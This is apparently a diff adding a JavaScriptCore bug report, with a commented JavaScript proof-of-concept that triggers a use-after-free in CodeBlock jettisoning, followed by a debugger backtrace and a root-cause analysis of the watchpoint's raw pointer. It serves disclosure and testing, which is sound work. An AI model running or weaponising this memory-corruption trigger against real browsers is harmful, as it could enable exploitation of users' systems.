@@ -1,0 +1,96 @@
+/*
+While fuzzing JavaScriptCore, I encountered the following (simplified and commented) JavaScript program which crashes jsc from current HEAD and release:
+*/
+
+    function v9() {
+        // Some watchpoint (on the LexicalEnvironment) is triggered here
+        // during the 2nd invocation which jettisons the CodeBlock for v9.
+
+        // Trigger GC here (in the 2nd invocation) and free the jettisoned CodeBlock.
+        const v18 = [13.37,13.37,13.37,13.37];
+        for (const v43 in v18) {
+            const v47 = new Float64Array(65493);
+        }
+
+        // Trigger some other watchpoint here, jettisoning the same CodeBlock
+        // again and thus crashing when touching the already freed memory.
+        const v66 = RegExp();
+
+        // Seems to be required to get the desired compilation
+        // behaviour in DFG (OSR enter in a loop)...
+        for (let v69 = 0; v69 < 10000; v69++) {
+            function v70() {
+                const v73 = v66.test("asdf");
+            }
+            v70();
+        }
+
+        // Inserts elements into the Array prototype so the
+        // first loop runs longer in the second invocation.
+        for (let v114 = 13.37; v114 < 10000; v114++) {
+            const v127 = [].__proto__;
+            v127[v114] = 1337;
+        }
+    }
+    const v182 = /i/g;
+    const v183 = "ii";
+    v183.replace(v182,v9);
+
+    // (Jettisoning is the process of discarding a unit of JIT compiled code
+    //  because it is no longer needed or is now unsafe to execute).
+
+/*
+When running in a debug build, it produces a crash similar to the following:
+
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xbadce8c0)
+    frame #0: 0x000000010066e091 JavaScriptCore`void JSC::VM::logEvent<...>(...) [inlined] std::__1::unique_ptr<...>::operator bool(this=0x00000000badce8c0) const at memory:2583
+(lldb) up 2
+frame #2: 0x000000010066d92e JavaScriptCore`JSC::CodeBlock::jettison(this=0x0000000109388b80, reason=JettisonDueToUnprofiledWatchpoint, mode=CountReoptimization, detail=0x00007ffeefbfc708) at CodeBlock.cpp:1957
+(lldb) x/4gx this
+0x109388b80: 0x0000000000000000 0x00000000badbeef0
+0x109388b90: 0x00000000badbeef0 0x00000000badbeef0
+(lldb) bt
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xbadce8c0)
+    frame #0: 0x000000010066e091 JavaScriptCore`void JSC::VM::logEvent<...>(...) [inlined] std::__1::unique_ptr<...>::operator bool(this=0x00000000badce8c0) const at memory:2583
+    frame #1: 0x000000010066e091 JavaScriptCore`void JSC::VM::logEvent<...>(this=0x00000000badbeef0, codeBlock=0x0000000109388b80, summary="jettison", func=0x00007ffeefbfc570)::$_10 const&) at VMInlines.h:59
+  * frame #2: 0x000000010066d92e JavaScriptCore`JSC::CodeBlock::jettison(this=0x0000000109388b80, reason=JettisonDueToUnprofiledWatchpoint, mode=CountReoptimization, detail=0x00007ffeefbfc708) at CodeBlock.cpp:1957
+    frame #3: 0x0000000100674a86 JavaScriptCore`JSC::CodeBlockJettisoningWatchpoint::fireInternal(this=0x0000000106541c08, (null)=0x0000000106600000, detail=0x00007ffeefbfc708) at CodeBlockJettisoningWatchpoint.cpp:40
+    frame #4: 0x000000010072a86c JavaScriptCore`JSC::Watchpoint::fire(this=0x0000000106541c08, vm=0x0000000106600000, detail=0x00007ffeefbfc708) at Watchpoint.cpp:55
+    frame #5: 0x000000010072b014 JavaScriptCore`JSC::WatchpointSet::fireAllWatchpoints(this=0x00000001065bf6e0, vm=0x0000000106600000, detail=0x00007ffeefbfc708) at Watchpoint.cpp:140
+    frame #6: 0x000000010072add6 JavaScriptCore`JSC::WatchpointSet::fireAllSlow(this=0x00000001065bf6e0, vm=0x0000000106600000, detail=0x00007ffeefbfc708) at Watchpoint.cpp:91
+    frame #7: 0x000000010067f790 JavaScriptCore`void JSC::WatchpointSet::fireAll<JSC::FireDetail const>(this=0x00000001065bf6e0, vm=0x0000000106600000, fireDetails=0x00007ffeefbfc708) at Watchpoint.h:190
+    frame #8: 0x000000010072a3bc JavaScriptCore`JSC::WatchpointSet::touch(this=0x00000001065bf6e0, vm=0x0000000106600000, detail=0x00007ffeefbfc708) at Watchpoint.h:198
+    frame #9: 0x0000000100b0a41b JavaScriptCore`JSC::WatchpointSet::touch(this=0x00000001065bf6e0, vm=0x0000000106600000, reason="Executed NotifyWrite") at Watchpoint.h:203
+    frame #10: 0x0000000100b0a3c2 JavaScriptCore`::operationNotifyWrite(exec=0x00007ffeefbfc830, set=0x00000001065bf6e0) at DFGOperations.cpp:2457
+
+As can be seen, the CodeBlock object has been freed by the GC and, since this is a debug build, overwritten with a poison value (0xbadbeef0).
+
+It appears that what is happening here is roughly the following:
+
+* The function v9 is called multiple times as callback during the string.replace operation
+* During the first invocation, the function v9 is JIT compiled at one of the inner loops and execution switches to the JIT code
+    * The JIT compiled code has various dependencies on the outside environment in the form of Watchpoints
+* During the 2nd invocation, the LexicalEnvironment of v9 is recreated, triggering a Watchpoint (presumably because the function was originally compiled at one of the inner loops) and jettisoning the associated CodeBlock
+* At that point, there are no more references to the CodeBlock, and the following GC frees the object
+* Still during the 2nd invocation, after GC, another Watchpoint of the previous JIT code fires, again trying to jettison the CodeBlock that has already been freed
+
+The freeing of the CodeBlock by the GC is possible because the Watchpoint itself only has a raw pointer to the CodeBlock and not any kind of GC reference that would keep it alive (or be set to nullptr):
+
+    class CodeBlockJettisoningWatchpoint : public Watchpoint {
+    public:
+        CodeBlockJettisoningWatchpoint(CodeBlock* codeBlock)
+            : m_codeBlock(codeBlock)
+        {
+        }
+
+    protected:
+        void fireInternal(VM&, const FireDetail&) override;
+
+    private:
+        CodeBlock* m_codeBlock;
+    };
+
+
+It appears that this scenario normally does not happen because the CodeBlock unlinks and frees its associated Watchpoints when it is destroyed.
+However, the reference chain is CodeBlock ---(RefPtr)---> JITCode ---(owning reference)---> Watchpoints, and in this case the JITCode is being kept alive at the entrypoint (CachedCall::call) for the duration of callback, thus keeping the Watchpoints alive as well even though the CodeBlock has already been freed.
+*/
